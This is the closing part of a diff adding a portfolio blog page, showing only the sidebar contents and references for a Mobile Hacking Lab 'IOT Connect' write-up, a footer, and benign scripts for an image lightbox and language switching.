+                                <a class="toc-link level-1" href="#vi-ket-luan">Kết luận</a>
+                            </nav>
+                            <div class="blog-reference">
+                                <div class="blog-toc-title">Tài liệu</div>
+                                <a class="blog-reference-link" href="https://www.mobilehackinglab.com/course/lab-iot-connect" target="_blank" rel="noopener noreferrer">Mobile Hacking Lab: IOT Connect</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking_lab_IOT_connect/mobile_hacking_lab_iot_connect_vi.md" target="_blank" rel="noopener noreferrer">mobile_hacking_lab_iot_connect_vi.md</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking_lab_IOT_connect/mobile_hacking_lab_iot_connect_en.md" target="_blank" rel="noopener noreferrer">mobile_hacking_lab_iot_connect_en.md</a>
+                            </div>
+                        </div>
+
+                        <div data-locale-toc="en">
+                            <div class="blog-toc-title">Contents</div>
+                            <nav class="blog-toc" id="blogTocNavEn">
+                                <a class="toc-link level-1" href="#en-mobile-hacking-lab-iot-connect">Mobile Hacking Lab: IOT Connect</a>
+                                <a class="toc-link level-1" href="#en-static-analysis">Static Analysis</a>
+                                <a class="toc-link level-1" href="#en-dynamic-analysis">Dynamic Analysis</a>
+                                <a class="toc-link level-1" href="#en-poc-exploit">PoC Exploit</a>
+                                <a class="toc-link level-1" href="#en-conclusion">Conclusion</a>
+                            </nav>
+                            <div class="blog-reference">
+                                <div class="blog-toc-title">References</div>
+                                <a class="blog-reference-link" href="https://www.mobilehackinglab.com/course/lab-iot-connect" target="_blank" rel="noopener noreferrer">Mobile Hacking Lab: IOT Connect</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking_lab_IOT_connect/mobile_hacking_lab_iot_connect_vi.md" target="_blank" rel="noopener noreferrer">mobile_hacking_lab_iot_connect_vi.md</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking_lab_IOT_connect/mobile_hacking_lab_iot_connect_en.md" target="_blank" rel="noopener noreferrer">mobile_hacking_lab_iot_connect_en.md</a>
+                            </div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="copyright">
+            <div>© 2026 Portfolio by <a href="./index.html">Phan Toan</a></div>
+            <span>|</span>
+            <div class="fillings"><a href="mailto:ptt.hust.dev@gmail.com">ptt.hust.dev@gmail.com</a></div>
+            <span>|</span>
+            <div class="friends"><a href="https://github.com/PhanTheToan" target="_blank" rel="noopener noreferrer">GitHub</a></div>
+        </div>
+    </footer>
+
+    <div class="blog-image-lightbox" id="blogImageLightbox" aria-hidden="true">
+        <button class="lightbox-close" id="blogImageLightboxClose" aria-label="Close image viewer">×</button>
+        <img id="blogImageLightboxImg" src="" alt="">
+        <div class="lightbox-caption" id="blogImageLightboxCaption"></div>
+    </div>
+
+    <script>
+        (function () {
+            const lightbox = document.getElementById("blogImageLightbox");
+            const lightboxImg = document.getElementById("blogImageLightboxImg");
+            const lightboxCaption = document.getElementById("blogImageLightboxCaption");
+            const lightboxClose = document.getElementById("blogImageLightboxClose");
+            const sourceImages = Array.from(document.querySelectorAll(".blog-markdown img"));
+            if (!lightbox || !lightboxImg || !lightboxCaption || !lightboxClose || !sourceImages.length) return;
+
+            const closeLightbox = () => {
+                lightbox.classList.remove("open");
+                lightbox.setAttribute("aria-hidden", "true");
+                document.body.classList.remove("blog-image-no-scroll");
+                lightboxImg.setAttribute("src", "");
+                lightboxImg.setAttribute("alt", "");
+                lightboxCaption.textContent = "";
+            };
+
+            sourceImages.forEach((img) => {
+                img.setAttribute("tabindex", "0");
+                img.setAttribute("role", "button");
+                img.setAttribute("aria-label", (img.getAttribute("alt") || "Image") + " - open full view");
+                img.addEventListener("click", () => {
+                    lightboxImg.setAttribute("src", img.getAttribute("src") || "");
+                    lightboxImg.setAttribute("alt", img.getAttribute("alt") || "Blog image preview");
+                    lightboxCaption.textContent = img.getAttribute("alt") || "";
+                    lightbox.classList.add("open");
+                    lightbox.setAttribute("aria-hidden", "false");
+                    document.body.classList.add("blog-image-no-scroll");
+                });
+                img.addEventListener("keydown", (event) => {
+                    if (event.key !== "Enter" && event.key !== " ") return;
+                    event.preventDefault();
+                    img.click();
+                });
+            });
+
+            lightboxClose.addEventListener("click", closeLightbox);
+            lightbox.addEventListener("click", (event) => {
+                if (event.target === lightbox) closeLightbox();
+            });
+            window.addEventListener("keydown", (event) => {
+                if (event.key === "Escape" && lightbox.classList.contains("open")) closeLightbox();
+            });
+        })();
+    </script>
+    <script>
+        (function () {
+            const localeButtons = Array.from(document.querySelectorAll(".article-locale-btn"));
+            const articlePanels = Array.from(document.querySelectorAll("[data-locale-panel]"));
+            const tocPanels = Array.from(document.querySelectorAll("[data-locale-toc]"));
+            if (!localeButtons.length || !articlePanels.length || !tocPanels.length) return;
+
+            let observer = null;
+
+            const setupToc = (locale) => {
+                if (observer) observer.disconnect();
+
+                const tocPanel = document.querySelector(`[data-locale-toc="${locale}"]`);
+                if (!tocPanel) return;
+
+                const links = Array.from(tocPanel.querySelectorAll(".toc-link"));
+                const sections = links.map((link) => document.querySelector(link.getAttribute("href"))).filter(Boolean);
+                if (!links.length || !sections.length) return;
+
+                const setActive = (id) => {
+                    links.forEach((link) => {
+                        const active = link.getAttribute("href") === `#${id}`;
+                        link.classList.toggle("active", active);
+                    });
+                };
+
+                observer = new IntersectionObserver(
+                    (entries) => {
+                        const visible = entries
+                            .filter((entry) => entry.isIntersecting)
+                            .sort((a, b) => a.boundingClientRect.top - b.boundingClientRect.top)[0];
+                        if (visible && visible.target.id) setActive(visible.target.id);
+                    },
+                    { rootMargin: "-22% 0px -60% 0px", threshold: [0.05, 0.3, 0.6] }
+                );
+
+                sections.forEach((section) => observer.observe(section));
+                setActive(sections[0].id);
+            };
+
+            const setLocale = (locale) => {
+                articlePanels.forEach((panel) => {
+                    panel.hidden = panel.getAttribute("data-locale-panel") !== locale;
+                });
+                tocPanels.forEach((panel) => {
+                    panel.hidden = panel.getAttribute("data-locale-toc") !== locale;
+                });
+                localeButtons.forEach((button) => {
+                    const active = button.getAttribute("data-locale") === locale;
+                    button.classList.toggle("active", active);
+                    button.setAttribute("aria-pressed", active ? "true" : "false");
+                });
+                document.documentElement.lang = locale;
+                setupToc(locale);
+            };
+
+            localeButtons.forEach((button) => {
+                button.addEventListener("click", () => setLocale(button.getAttribute("data-locale")));
+            });
+
+            setLocale("en");
+        })();
+    </script>
+    <script src="./js/main.min.js"></script>
+</body>
+</html>
